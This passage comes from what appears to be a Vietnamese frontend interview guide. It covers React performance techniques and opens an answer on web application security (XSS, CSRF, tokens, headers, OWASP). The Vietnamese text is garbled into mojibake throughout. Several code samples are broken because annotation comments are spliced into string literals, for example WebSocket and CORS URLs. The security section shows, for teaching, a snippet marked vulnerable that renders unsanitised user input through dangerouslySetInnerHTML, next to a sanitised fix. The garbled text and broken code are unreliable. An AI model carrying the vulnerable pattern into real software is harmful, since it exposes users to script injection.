          // T√°ch React libraries ri√™ng (√≠t thay ƒë·ªïi ‚Üí cache browser t·ªët)
          // Khi update app code, React vendor v·∫´n d√πng cache c≈©
          'react-vendor': ['react', 'react-dom', 'react-router-dom'],

          // T√°ch chart libraries (r·∫•t n·∫∑ng - 500KB+)
          // Ch·ªâ load khi user v√†o trang c√≥ chart
          'chart-vendor': ['recharts', 'lightweight-charts'],

          // T√°ch utilities th√†nh bundle ri√™ng
          utils: ['lodash-es', 'date-fns', 'axios'],
        },
      },
    },

    // ‚úÖ Minify: N√©n code (x√≥a whitespace, r√∫t ng·∫Øn t√™n bi·∫øn)
    // Terser: Tool minify m·∫°nh nh·∫•t hi·ªán t·∫°i
    minify: 'terser',
    terserOptions: {
      compress: {
        drop_console: true, // X√≥a t·∫•t c·∫£ console.log trong production
        drop_debugger: true, // X√≥a debugger statements
      },
    },

    // ‚úÖ Source Maps: 'hidden' = c√≥ source maps nh∆∞ng kh√¥ng expose
    // L√Ω do: Debug ƒë∆∞·ª£c l·ªói production nh∆∞ng kh√¥ng l·ªô source code
    sourcemap: 'hidden',

    // ‚úÖ C·∫£nh b√°o n·∫øu chunk > 500KB (qu√° l·ªõn ‚Üí load ch·∫≠m)
    chunkSizeWarningLimit: 500,
  },

  // ‚úÖ Tree-shaking: Lo·∫°i b·ªè code kh√¥ng d√πng ƒë·∫øn
  // VD: import { map } from 'lodash' ‚Üí ch·ªâ bundle h√†m map, b·ªè 99% lodash
  optimizeDeps: {
    include: ['react', 'react-dom'], // Pre-bundle c√°c deps quan tr·ªçng
  },
});

 // Ch√∫ gi·∫£i: üì¶ B. Lazy Loading Routes (T·∫£i Trang Theo Route)
// Gi·∫£i th√≠ch: Thay v√¨ load to√†n b·ªô app l√∫c ƒë·∫ßu, ch·ªâ load trang user c·∫ßn
import { lazy, Suspense } from 'react';
import { Routes, Route } from 'react-router-dom';

 // Ch√∫ gi·∫£i: ‚úÖ Lazy load pages: T·∫°o dynamic import ‚Üí t·∫°o separate chunk cho m·ªói page
// VD: User v√†o "/" ‚Üí ch·ªâ t·∫£i Dashboard.js, KH√îNG t·∫£i Trading.js, Portfolio.js
// K·∫øt qu·∫£: Initial bundle gi·∫£m t·ª´ 2.5MB ‚Üí 300KB
const Dashboard = lazy(() => import('./pages/Dashboard')); // T·∫£i khi v√†o "/"
const Trading = lazy(() => import('./pages/Trading')); // T·∫£i khi v√†o "/trading"
const Portfolio = lazy(() => import('./pages/Portfolio')); // T·∫£i khi v√†o "/portfolio"
const Analytics = lazy(() => import('./pages/Analytics')); // T·∫£i khi v√†o "/analytics"

// Skeleton Loader: UI hi·ªÉn th·ªã trong l√∫c ch·ªù page load
// T·ªët h∆°n l√† m√†n h√¨nh tr·∫Øng (UX t·ªët h∆°n)
const PageLoader = () => (
  <div className="flex items-center justify-center h-screen">
    {/* Spinner animation quay tr√≤n */}
    <div className="animate-spin rounded-full h-12 w-12 border-b-2 border-blue-500"></div>
    <span className="ml-3">ƒêang t·∫£i...</span>
  </div>
);

export default function App() {
  return (
    // Suspense: B·∫Øt loading state c·ªßa lazy components
    // fallback: Component hi·ªÉn th·ªã trong l√∫c ch·ªù load
    <Suspense fallback={<PageLoader />}>
      <Routes>
        <Route path="/" element={<Dashboard />} />
        <Route path="/trading" element={<Trading />} />
        <Route path="/portfolio" element={<Portfolio />} />
        <Route path="/analytics" element={<Analytics />} />
      </Routes>
    </Suspense>
  );
}

 // Ch√∫ gi·∫£i: ============================================
 // Ch√∫ gi·∫£i: 3Ô∏è‚É£ RENDERING OPTIMIZATION (T·ªêI ∆ØU RENDER)
 // Ch√∫ gi·∫£i: ============================================

 // Ch√∫ gi·∫£i: üé® A. React.memo + useMemo + useCallback (B·ªô 3 t·ªëi ∆∞u render)
import { memo, useMemo, useCallback } from 'react';

// ‚úÖ React.memo: B·ªçc component ƒë·ªÉ SKIP re-render n·∫øu props kh√¥ng ƒë·ªïi
// Ho·∫°t ƒë·ªông: React so s√°nh props c≈© vs m·ªõi (shallow comparison)
// ‚Üí N·∫øu gi·ªëng nhau ‚Üí KH√îNG re-render ‚Üí TƒÉng performance
const OrderItem = memo(function OrderItem({ order, onDelete }) {
  console.log('OrderItem render'); // Log n√†y CH·ªà ch·∫°y khi props thay ƒë·ªïi
  return (
    <div>
      <span>{order.symbol}</span>
      <button onClick={() => onDelete(order.id)}>X√≥a</button>
    </div>
  );
});
// K·∫øt qu·∫£: 1000 orders ‚Üí parent re-render ‚Üí KH√îNG re-render 1000 OrderItem

 // Ch√∫ gi·∫£i: Component cha
function OrderList({ orders }) {
 // Tham chi·∫øu: bi·∫øn ch·ª©a ƒë·ªãa ch·ªâ t·ªõi object trong heap; `const` kh√≥a tham chi·∫øu ch·ª© kh√¥ng kh√≥a n·ªôi dung object.
  // V·∫•n ƒë·ªÅ: M·ªói l·∫ßn render ‚Üí t·∫°o function m·ªõi ‚Üí OrderItem re-render v√¨ onDelete kh√°c
  // Gi·∫£i ph√°p: useCallback l∆∞u function ‚Üí reference gi·ªëng nhau ‚Üí OrderItem KH√îNG re-render
  const handleDelete = useCallback((id: string) => {
    console.log('X√≥a order:', id);
    // Call API x√≥a order...
  }, []); // [] = function kh√¥ng ƒë·ªïi, t·∫°o 1 l·∫ßn duy nh·∫•t

  // ‚úÖ useMemo: Cache k·∫øt qu·∫£ t√≠nh to√°n n·∫∑ng
  // V·∫•n ƒë·ªÅ: M·ªói render ‚Üí sort l·∫°i 10,000 orders ‚Üí ch·∫≠m
  // Gi·∫£i ph√°p: useMemo cache k·∫øt qu·∫£ ‚Üí ch·ªâ sort l·∫°i KHI orders thay ƒë·ªïi
  const sortedOrders = useMemo(() => {
    console.log('ƒêang sort orders...'); // Ch·ªâ log khi orders thay ƒë·ªïi
    return orders.sort((a, b) => b.timestamp - a.timestamp); // Ch√∫ gi·∫£i: Sort theo th·ªùi gian m·ªõi nh·∫•t
  }, [orders]); // [orders] = ch·ªâ t√≠nh l·∫°i khi orders thay ƒë·ªïi

  return (
    <div>
      {sortedOrders.map((order) => (
        <OrderItem
          key={order.id} // key gi√∫p React track item n√†o thay ƒë·ªïi
          order={order}
          onDelete={handleDelete} // Reference gi·ªëng nhau ‚Üí memo ho·∫°t ƒë·ªông
        />
      ))}
    </div>
  );
}
// K·∫øt qu·∫£: Re-render ch·ªâ m·∫•t 20ms thay v√¨ 500ms

 // Ch√∫ gi·∫£i: üé® B. Virtual Scrolling (Cu·ªôn ·∫¢o cho 10K+ items)
// Gi·∫£i th√≠ch: Thay v√¨ render 10,000 items ‚Üí ch·ªâ render items hi·ªÉn th·ªã tr√™n m√†n h√¨nh
// VD: M√†n h√¨nh cao 600px, m·ªói item 50px ‚Üí ch·ªâ render 12 items (600/50)
import { FixedSizeList as List } from 'react-window';

interface Order {
  id: string;
  symbol: string;
  quantity: number;
  price: number;
}

function GoodOrderList({ orders }: { orders: Order[] }) {
 // Ch√∫ gi·∫£i: Row component: Render 1 order item
  // Nh·∫≠n index + style t·ª´ react-window (style c√≥ position: absolute + top)
  const Row = ({ index, style }) => {
    const order = orders[index]; // Ch√∫ gi·∫£i: L·∫•y order theo index
    return (
      // style ch·ª©a position absolute + top ƒë·ªÉ ƒë·∫∑t item ƒë√∫ng v·ªã tr√≠
      <div style={style} className="flex items-center border-b px-4">
        <span className="w-20 font-bold">{order.symbol}</span>
        <span className="w-32">
          {order.quantity} @ ${order.price}
        </span>
      </div>
    );
  };

  return (
 // Ch√∫ gi·∫£i: FixedSizeList: Component virtual scrolling
    // Ho·∫°t ƒë·ªông: T√≠nh to√°n item n√†o trong viewport ‚Üí ch·ªâ render items ƒë√≥
    <List
      height={600} // Chi·ªÅu cao container (px)
      itemCount={orders.length} // Ch√∫ gi·∫£i: T·ªïng s·ªë items (10,000)
      itemSize={50} // Chi·ªÅu cao m·ªói item (px)
      width="100%" // Chi·ªÅu r·ªông container
    >
      {Row} {/* Render function cho m·ªói item */}
    </List>
  );
}
// K·∫øt qu·∫£:
// ‚ùå Kh√¥ng d√πng virtual scroll: Render 10,000 DOM nodes ‚Üí lag, FPS 15
// ‚úÖ D√πng virtual scroll: Ch·ªâ render ~12 DOM nodes ‚Üí m∆∞·ª£t, FPS 60

 // Ch√∫ gi·∫£i: ============================================
// 4Ô∏è‚É£ STATE MANAGEMENT OPTIMIZATION (T·ªêI ∆ØU QU·∫¢N L√ù STATE)
 // Ch√∫ gi·∫£i: ============================================

// üè™ Zustand: Th∆∞ vi·ªán state management nh·∫π, nhanh h∆°n Redux
// ∆Øu ƒëi·ªÉm:
// - Kh√¥ng c·∫ßn Provider wrapper
// - Selective subscription (ch·ªâ subscribe state c·∫ßn thi·∫øt)
// - API ƒë∆°n gi·∫£n, √≠t boilerplate
import create from 'zustand';

interface Order {
  id: string;
  symbol: string;
  quantity: number;
  price: number;
}

interface TradingStore {
  orders: Order[]; // Danh s√°ch orders
  prices: Record<string, number>; // Gi√° real-time
  addOrder: (order: Order) => void;
  updatePrice: (symbol: string, price: number) => void;
}

// T·∫°o store: H√†m nh·∫≠n set function ƒë·ªÉ update state
const useTradingStore = create<TradingStore>((set) => ({
  orders: [],
  prices: {},

  // Action th√™m order
  addOrder: (order) =>
    set((state) => ({
      orders: [...state.orders, order], // Mutable (c√≥ th·ªÉ thay ƒë·ªïi): thu·ªôc t√≠nh object ho·∫∑c ph·∫ßn t·ª≠ m·∫£ng c√≥ th·ªÉ b·ªã s·ª≠a tr·ª±c ti·∫øp; n·∫øu c·∫ßn b·∫•t bi·∫øn, d√πng `Object.freeze()` (ch·ªâ n√¥ng) ho·∫∑c pattern/ th∆∞ vi·ªán b·∫•t bi·∫øn. B·∫•t bi·∫øn: gi√° tr·ªã kh√¥ng thay ƒë·ªïi sau khi t·∫°o; th∆∞·ªùng d√πng ƒë·ªÉ tr√°nh side-effect v√† d·ªÖ reasoning.
    })),

  // Action update gi√°
  updatePrice: (symbol, price) =>
    set((state) => ({
      prices: { ...state.prices, [symbol]: price },
    })),
}));

// ‚úÖ Selective Subscription: Ch·ªâ subscribe ph·∫ßn state c·∫ßn thi·∫øt
// Component n√†y CH·ªà re-render khi orders thay ƒë·ªïi
// Khi prices update ‚Üí component KH√îNG re-render (v√¨ kh√¥ng subscribe prices)
function OrderList() {
 // Ch√∫ gi·∫£i: Selector function: state => state.orders
  // Zustand compare selector result ‚Üí ch·ªâ re-render n·∫øu orders thay ƒë·ªïi
  const orders = useTradingStore((state) => state.orders);

  return (
    <div>
      {orders.map((order) => (
        <OrderItem key={order.id} order={order} />
      ))}
    </div>
  );
}

// Component n√†y CH·ªà re-render khi prices thay ƒë·ªïi
function PriceDisplay({ symbol }: { symbol: string }) {
  // Subscribe ch·ªâ 1 gi√° c·ª• th·ªÉ
  const price = useTradingStore((state) => state.prices[symbol]);

  return (
    <span>
      Gi√° {symbol}: ${price}
    </span>
  );
}
// K·∫øt qu·∫£: WebSocket update 100 gi√°/gi√¢y ‚Üí ch·ªâ 100 components nh·ªè re-render
// Thay v√¨ to√†n b·ªô app re-render (nh∆∞ Context API)

 // Ch√∫ gi·∫£i: ============================================
// 5Ô∏è‚É£ MEMORY MANAGEMENT (QU·∫¢N L√ù B·ªò NH·ªö)
 // Ch√∫ gi·∫£i: ============================================

 // Ch√∫ gi·∫£i: üßπ Cleanup useEffect: D·ªçn d·∫πp resources khi component unmount
// V·∫•n ƒë·ªÅ: Kh√¥ng cleanup ‚Üí memory leak (b·ªô nh·ªõ tƒÉng d·∫ßn 50MB ‚Üí 500MB)

import { useEffect, useState, useRef } from 'react';

function TradingChart() {
  const [chartData, setChartData] = useState([]);

  useEffect(() => {
 // Ch√∫ gi·∫£i: T·∫°o WebSocket connection
    const ws = new WebSocket('wss: // Ch√∫ gi·∫£i: api.trading.com');

    // L·∫Øng nghe data t·ª´ server
    ws.onmessage = (event) => {
      const data = JSON.parse(event.data);
      setChartData((prev) => [...prev, data]); // Ch√∫ gi·∫£i: Update chart data
    };

    ws.onerror = (error) => {
      console.error('WebSocket error:', error);
    };

 // Ch√∫ gi·∫£i: ‚úÖ QUAN TR·ªåNG: Cleanup function
    // Ch·∫°y khi component unmount ho·∫∑c dependencies thay ƒë·ªïi
    return () => {
      console.log('D·ªçn d·∫πp WebSocket...');

      // ƒê√≥ng WebSocket connection
      if (
        ws.readyState === WebSocket.OPEN ||
        ws.readyState === WebSocket.CONNECTING
      ) {
        ws.close(); // Ng·∫Øt k·∫øt n·ªëi ‚Üí gi·∫£i ph√≥ng memory
      }

      // N·∫øu kh√¥ng cleanup:
      // - WebSocket v·∫´n m·ªü ‚Üí nh·∫≠n data ‚Üí update state c·ªßa component ƒë√£ unmount
      // - G√¢y memory leak + warning "Can't perform state update on unmounted component"
    };
  }, []); // Ch√∫ gi·∫£i: [] = ch·ªâ ch·∫°y 1 l·∫ßn khi mount

  return <div>Bi·ªÉu ƒë·ªì trading...</div>;
}

 // Ch√∫ gi·∫£i: üßπ B. Cancel API Requests v·ªõi AbortController
function OrderHistory() {
  const [orders, setOrders] = useState([]);

  useEffect(() => {
    // T·∫°o AbortController ƒë·ªÉ cancel request
    const abortController = new AbortController();
    const signal = abortController.signal;

 // Ch√∫ gi·∫£i: Fetch data v·ªõi signal
    fetch('/api/orders?limit=1000', { signal })
      .then((res) => res.json())
      .then((data) => setOrders(data))
      .catch((error) => {
        // AbortError = request b·ªã cancel (KH√îNG ph·∫£i l·ªói th·∫≠t)
        if (error.name === 'AbortError') {
          console.log('Request ƒë√£ ƒë∆∞·ª£c cancel');
        } else {
          console.error('L·ªói:', error);
        }
      });

 // Ch√∫ gi·∫£i: ‚úÖ Cleanup: Cancel request khi unmount
    return () => {
      console.log('Cancel API request...');
      abortController.abort(); // Cancel request ƒëang ch·∫°y

 // Ch√∫ gi·∫£i: T·∫°i sao c·∫ßn cancel?
      // - User chuy·ªÉn trang nhanh ‚Üí request c≈© v·∫´n ch·∫°y ‚Üí waste bandwidth
      // - Request tr·∫£ v·ªÅ ‚Üí update state unmounted component ‚Üí memory leak
    };
  }, []);

  return <div>L·ªãch s·ª≠ orders...</div>;
}

 // Ch√∫ gi·∫£i: üßπ C. Clear Timers & Intervals
function PriceRefresh() {
  const [price, setPrice] = useState(0);

  useEffect(() => {
    // Refresh gi√° m·ªói 5 gi√¢y
    const intervalId = setInterval(() => {
      fetch('/api/price')
        .then((res) => res.json())
        .then((data) => setPrice(data.price));
    }, 5000);

 // Ch√∫ gi·∫£i: ‚úÖ Cleanup: Clear interval khi unmount
    return () => {
      console.log('Clear interval...');
      clearInterval(intervalId); // Ch√∫ gi·∫£i: D·ª´ng interval

      // N·∫øu kh√¥ng clear:
 // Ch√∫ gi·∫£i: - Interval v·∫´n ch·∫°y sau unmount ‚Üí call API ‚Üí update state
      // - Memory leak + nhi·ªÅu intervals ch·∫°y song song
    };
  }, []);

  return <div>Gi√° hi·ªán t·∫°i: ${price}</div>;
}

 // Ch√∫ gi·∫£i: üßπ D. Remove Event Listeners
function ResizableChart() {
  const chartRef = useRef<HTMLDivElement>(null);

  useEffect(() => {
 // Ch√∫ gi·∫£i: Handler cho window resize
    const handleResize = () => {
      if (chartRef.current) {
        // Resize chart khi window thay ƒë·ªïi
        console.log('Resize chart to:', window.innerWidth);
      }
    };

    // ƒêƒÉng k√Ω event listener
    window.addEventListener('resize', handleResize);

 // Ch√∫ gi·∫£i: ‚úÖ Cleanup: Remove event listener
    return () => {
      console.log('Remove resize listener...');
      window.removeEventListener('resize', handleResize);

      // N·∫øu kh√¥ng remove:
 // Ch√∫ gi·∫£i: - Listener v·∫´n t·ªìn t·∫°i sau unmount
      // - Nhi·ªÅu components ‚Üí nhi·ªÅu listeners ‚Üí performance gi·∫£m
      // - Memory leak (function + closure kh√¥ng ƒë∆∞·ª£c garbage collected)
    };
  }, []);

  return <div ref={chartRef}>Chart c√≥ th·ªÉ resize</div>;
}
// K·∫øt qu·∫£ cleanup ƒë√∫ng c√°ch: Memory ·ªïn ƒë·ªãnh ~80MB thay v√¨ leak ƒë·∫øn 500MB
```

**üéØ K·∫øt Qu·∫£ Sau Optimization:**

```
‚îå‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îê
‚îÇ           PERFORMANCE METRICS - BEFORE vs AFTER                 ‚îÇ
‚îú‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚î§
‚îÇ  Metric              ‚îÇ Before      ‚îÇ After       ‚îÇ Improvement ‚îÇ
‚îÇ ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îº‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îº‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îº‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ ‚îÇ
‚îÇ  Initial Load        ‚îÇ 5-7s        ‚îÇ 1.5-2s      ‚îÇ 70% faster  ‚îÇ
‚îÇ  Bundle Size         ‚îÇ 2.5MB       ‚îÇ 450KB       ‚îÇ 82% smaller ‚îÇ
‚îÇ  FCP (First Paint)   ‚îÇ 3s          ‚îÇ 0.8s        ‚îÇ 73% faster  ‚îÇ
‚îÇ  TTI (Interactive)   ‚îÇ 6s          ‚îÇ 2s          ‚îÇ 67% faster  ‚îÇ
‚îÇ  Scroll FPS          ‚îÇ 15 FPS      ‚îÇ 60 FPS      ‚îÇ 4x better   ‚îÇ
‚îÇ  Memory Usage        ‚îÇ 500MB       ‚îÇ 80MB        ‚îÇ 84% less    ‚îÇ
‚îÇ  Re-renders/sec      ‚îÇ 200+        ‚îÇ 10-20       ‚îÇ 90% less    ‚îÇ
‚îî‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îò
```

**Best Practices:**

1. **Measure First**: D√πng Lighthouse, Chrome DevTools Performance
2. **Bundle Analysis**: `npm run build -- --analyze`
3. **Code Splitting**: Route-level + Component-level
4. **State Management**: Context cho static, Zustand cho complex state
5. **Memory Management**: Always cleanup useEffect

**Common Mistakes (L·ªói Th∆∞·ªùng G·∫∑p):**

```typescript
 // Ch√∫ gi·∫£i: ‚ùå L·ªñI 1: Inline functions trong render
// V·∫•n ƒë·ªÅ: M·ªói render t·∫°o function m·ªõi ‚Üí child component re-render kh√¥ng c·∫ßn thi·∫øt
{
  items.map((item) => (
    <Item
      key={item.id}
      onClick={() => handleClick(item)} // Ch√∫ gi·∫£i: ‚ùå Function m·ªõi m·ªói l·∫ßn render
    />
  ));
}

// ‚úÖ C√ÅCH S·ª¨A: D√πng useCallback ƒë·ªÉ memoize function
const handleClick = useCallback((item) => {
  console.log('Clicked:', item);
  // X·ª≠ l√Ω logic...
}, []); // Function reference kh√¥ng ƒë·ªïi

{
  items.map((item) => (
    <Item
      key={item.id}
      onClick={handleClick} // ‚úÖ Reference gi·ªëng nhau ‚Üí kh√¥ng re-render
      item={item}
    />
  ));
}

// ‚ùå L·ªñI 2: Kh√¥ng cleanup useEffect ‚Üí Memory Leak
useEffect(() => {
  const ws = new WebSocket('wss: // Ch√∫ gi·∫£i: api.example.com');
  ws.onmessage = (e) => setData(e.data);
  // ‚ùå Thi·∫øu cleanup ‚Üí WebSocket kh√¥ng ƒë√≥ng ‚Üí memory leak
}, []);

// ‚úÖ C√ÅCH S·ª¨A: Lu√¥n cleanup resources
useEffect(() => {
  const ws = new WebSocket('wss: // Ch√∫ gi·∫£i: api.example.com');
  ws.onmessage = (e) => setData(e.data);

  return () => {
    ws.close(); // ‚úÖ ƒê√≥ng WebSocket khi unmount
  };
}, []);

// ‚ùå L·ªñI 3: Qu√™n dependencies trong useMemo/useCallback
const sortedData = useMemo(() => {
  return data.sort((a, b) => a[sortBy] - b[sortBy]);
}, []); // ‚ùå Thi·∫øu [data, sortBy] ‚Üí kh√¥ng update khi data/sortBy thay ƒë·ªïi

// ‚úÖ C√ÅCH S·ª¨A: Khai b√°o ƒë·∫ßy ƒë·ªß dependencies
const sortedData = useMemo(() => {
  return data.sort((a, b) => a[sortBy] - b[sortBy]);
}, [data, sortBy]); // ‚úÖ T√≠nh l·∫°i khi data ho·∫∑c sortBy thay ƒë·ªïi

// ‚ùå L·ªñI 4: Render to√†n b·ªô list l·ªõn
function OrderList({ orders }) {
  return (
    <div>
      {orders.map((order) => (
        <OrderRow key={order.id} order={order} />
      ))}
    </div>
  );
} // Ch√∫ gi·∫£i: ‚ùå 10,000 items ‚Üí 10,000 DOM nodes ‚Üí lag

// ‚úÖ C√ÅCH S·ª¨A: D√πng virtual scrolling
import { FixedSizeList } from 'react-window';

function OrderList({ orders }) {
  return (
    <FixedSizeList height={600} itemCount={orders.length} itemSize={50}>
      {({ index, style }) => (
        <div style={style}>
          <OrderRow order={orders[index]} />
        </div>
      )}
    </FixedSizeList>
  );
} // ‚úÖ Ch·ªâ render ~12 items ‚Üí m∆∞·ª£t m√†
```

---
---
## 39. üîê Q39: B·∫£o M·∫≠t Security tr√™n Web Application  

**P1: T√™n c√¢u h·ªèi:** üîê Q39: B·∫£o M·∫≠t Security tr√™n Web Application  

**P2: Tr·∫£ l·ªùi (Senior):**

## **‚≠ê T√ìM T·∫ÆT CHO PH·ªéNG V·∫§N SENIOR/STAFF**

### **üéØ C√¢u Tr·∫£ L·ªùi Ng·∫Øn G·ªçn (3-4 ph√∫t):**

**"Web security = 7 layers: HTTPS, XSS, CSRF, Auth, Storage, API, Headers. Defense in depth.**

**üõ°Ô∏è 7-Layer Security Strategy:**

1. **HTTPS + TLS**:
   - M√£ h√≥a data gi·ªØa browser ‚Üî server ‚Üí ngƒÉn Man-in-the-Middle.
   - **HSTS**: `Strict-Transport-Security` header ‚Üí b·∫Øt bu·ªôc HTTPS.

2. **XSS Prevention (Cross-Site Scripting)**:
   - **Problem**: Attacker inject malicious `<script>` ‚Üí steal cookies, session.
   - **Solution**:
     - **React auto-escape**: `{userInput}` auto sanitize.
     - **DOMPurify**: Sanitize HTML khi c·∫ßn `dangerouslySetInnerHTML`.
     - **CSP**: `Content-Security-Policy` header ‚Üí block inline scripts.
   ```js
 // Ch√∫ gi·∫£i: ‚ùå Vulnerable
   <div dangerouslySetInnerHTML={{ __html: userInput }} />
 // Ch√∫ gi·∫£i: ‚úÖ Safe
   import DOMPurify from 'dompurify';
   <div dangerouslySetInnerHTML={{ __html: DOMPurify.sanitize(userInput) }} />
   ```

3. **CSRF Protection (Cross-Site Request Forgery)**:
   - **Problem**: Attacker trick user send malicious request (e.g., transfer money).
   - **Solution**:
     - **CSRF Token**: Server generate unique token per session ‚Üí include in forms.
     - **SameSite Cookies**: `SameSite=Strict` ‚Üí cookies ch·ªâ send same-origin requests.

4. **Authentication & Authorization**:
   - **JWT**: Access token (short-lived, 15 min) + Refresh token (long-lived, 7 days).
   - **HttpOnly Cookies**: Store tokens ‚Üí JavaScript kh√¥ng access ƒë∆∞·ª£c (prevent XSS steal).
   - **Token Refresh**: Auto refresh access token khi expired (seamless UX).

5. **Secure Storage**:
   - **NEVER localStorage for sensitive data**: JavaScript c√≥ th·ªÉ access ‚Üí XSS risk.
   - **HttpOnly Cookies**: Best cho tokens (server-only access).
   - **Encrypt sensitive data**: AES-256 encryption tr∆∞·ªõc khi store.

6. **API Security**:
   - **Rate Limiting**: Limit requests (100/min) ‚Üí prevent brute-force.
   - **Input Validation**: Validate/sanitize inputs server-side (kh√¥ng tin client).
   - **CORS**: Restrict origins c√≥ th·ªÉ call API.
   ```js
 // Ch√∫ gi·∫£i: Server (Express)
   app.use(cors({ origin: 'https: // Ch√∫ gi·∫£i: trusted-domain.com' }));
   ```

7. **Security Headers**:
   - **CSP**: `Content-Security-Policy: default-src 'self'` ‚Üí block external scripts.
   - **X-Frame-Options**: `DENY` ‚Üí prevent clickjacking.
   - **X-Content-Type-Options**: `nosniff` ‚Üí prevent MIME sniffing.
   - **Referrer-Policy**: Control referrer info leaked.

**‚ö†Ô∏è Common Vulnerabilities (OWASP Top 10):**
1. **Injection** (SQL, XSS): Sanitize inputs, use parameterized queries.
2. **Broken Authentication**: Strong passwords, MFA, session timeout.
3. **Sensitive Data Exposure**: Encrypt data, HTTPS, HttpOnly cookies.
4. **XML External Entities (XXE)**: Disable XML external entity processing.
5. **Broken Access Control**: Server-side authorization checks.
6. **Security Misconfiguration**: Remove default credentials, disable debug mode.
7. **XSS**: Escape outputs, CSP headers.
8. **Insecure Deserialization**: Validate serialized data.
9. **Using Components with Known Vulnerabilities**: Regular dependency updates (`npm audit`).
10. **Insufficient Logging & Monitoring**: Log security events, monitor anomalies.

**üí° Senior Insights:**
- **Defense in Depth**: Multiple layers ‚Üí n·∫øu 1 layer fail, others protect.
- **Security Audits**: Regular penetration testing, code reviews.
- **Dependency Scanning**: `npm audit`, Snyk, Dependabot ‚Üí auto update vulnerable packages.
- **Security Headers**: Use helmet.js (Node.js) ‚Üí auto set secure headers.
- **HTTPS Everywhere**: Even internal apps ‚Üí prevent internal network sniffing.

**üöÄ Best Practices:**
- Principle of Least Privilege: Users ch·ªâ access data c·∫ßn thi·∫øt.
- Never trust client-side validation: Always validate server-side.
- Encrypt sensitive data at rest & in transit.
- Regular security training cho developers.

---

**‚ùì T√¨nh Hu·ªëng:**

B·∫°n l√† Senior Frontend Developer ph·ª• tr√°ch security cho Trading Platform x·ª≠ l√Ω:

- **Sensitive Data**: User credentials, trading orders, financial transactions
- **API Calls**: 1000+ requests/minute ƒë·∫øn backend APIs
- **User Input**: Form submissions, search queries, comments
- **Third-party Integration**: Payment gateways, analytics, CDN

**Threats (M·ªëi ƒëe d·ªça):**

- XSS attacks (inject malicious scripts)
- CSRF attacks (force unwanted actions)
- Man-in-the-Middle (intercept data)
- Session hijacking
- Data exposure in client-side code

**Y√™u c·∫ßu:** Thi·∫øt k·∫ø v√† implement chi·∫øn l∆∞·ª£c b·∫£o m·∫≠t to√†n di·ªán (defense in depth).

**‚úÖ ƒê√°p √Ån Chi Ti·∫øt:**

**üõ°Ô∏è 7 T·∫ßng B·∫£o M·∫≠t (7-Layer Security Strategy):**

```
‚îå‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îê
‚îÇ              WEB SECURITY LAYERS                              ‚îÇ
